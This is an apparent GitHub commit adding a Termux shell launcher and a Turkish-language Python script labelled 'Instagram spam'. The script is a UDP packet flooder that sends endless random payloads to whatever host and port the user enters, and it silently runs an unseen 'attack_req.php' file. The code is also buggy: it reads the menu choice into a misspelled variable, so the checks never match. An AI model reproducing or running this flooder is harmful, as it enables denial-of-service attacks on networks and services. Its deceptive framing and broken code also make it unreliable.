1a2b11231ec868a8015982f939072a19ac21b2a3
ZoRRaKin0 <105127547+ZoRRaKin0@users.noreply.github.com>
2022-05-07 22:40:00 +0300

    Add files via upload

---
+++ basla.sh
@@ -0,0 +1,8 @@
+clear
+pkg install figlet
+clear
+figlet Python3 Modulu
+sleep (2)
+pkg install python3
+figlet Devam...
+python3 instaspam.py
---
+++ instaspam.py
@@ -0,0 +1,88 @@
+import os
+import random 
+import socket
+import colorama
+from colorama import Fore, Back, Style
+os.system ('python -m pip install colorama')
+os.system ('clear')
+os.system ('pkg install figlet')
+os.system('pkg install php')
+os.system('php attack_req.php')
+os.system('clear')
+os.system ('figlet İNSTAGRAM SPAM')
+
+print(Fore.GREEN)
+print ('     1- 2.000 spam [Başlangıç]')
+print ('     2- 4.00 spam [Başlangıç]')
+print(Fore.YELLOW)
+print ('     3- 6.000 spam [Orta seviye]')
+print ('     4- 8.000 spam [Güçlü]')
+print(Fore.RED)
+print ('     5- 10.000 spam [Sert attack]')
+
+print(Fore.WHITE)
+sapm = input("Seçenek giriniz > ")
+if(spam=="1"):
+		
+		ka = str(input("kullanıcı adı giriniz :"))
+		ki = int(input("kullanıcı id :"))
+
+		bytes = random._urandom(10000)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sayac = 0
+		while True:
+			sock.sendto(bytes,(ka , ki))
+			sayac = sayac + 1
+			print("Gönderilen paket: %s" %(sayac))
+
+if(spam=="2"):
+		
+		ka = str(input("kullanıcı adı giriniz :"))
+		ki = int(input("kullanıcı id :"))
+
+		bytes = random._urandom(20000)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sayac = 0
+		while True:
+			sock.sendto(bytes,(ka , ki))
+			sayac = sayac + 1
+			print("Gönderilen paket: %s" %(sayac))
+
+if(spam=="3"):
+		
+		ka = str(input("kullanıcı adı giriniz :"))
+		ki = int(input("kullanıcı id : "))
+
+		bytes = random._urandom(30000)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sayac = 0
+		while True:
+			sock.sendto(bytes,(ka , ki))
+			sayac = sayac + 1
+			print("Gönderilen paket: %s" %(sayac))
+
+if(spam=="4"):
+		
+		ka = str(input("kullanıcı adı giriniz :"))
+		ki = int(input("kullanıcı id :"))
+
+		bytes = random._urandom(40000)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sayac = 0
+		while True:
+			sock.sendto(bytes,(ka , ki))
+			sayac = sayac + 1
+			print("Gönderilen paket: %s" %(sayac))
+
+if(spam=="5"):
+		
+		ka = str(input("kullanıcı adı giriniz :"))
+		ki = int(input("kullanıcı id :"))
+
+		bytes = random._urandom(50000)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sayac = 0
+		while True:
+			sock.sendto(bytes,(ka , ki))
+			sayac = sayac + 1
+			print("Gönderilen paket: %s" %(sayac))
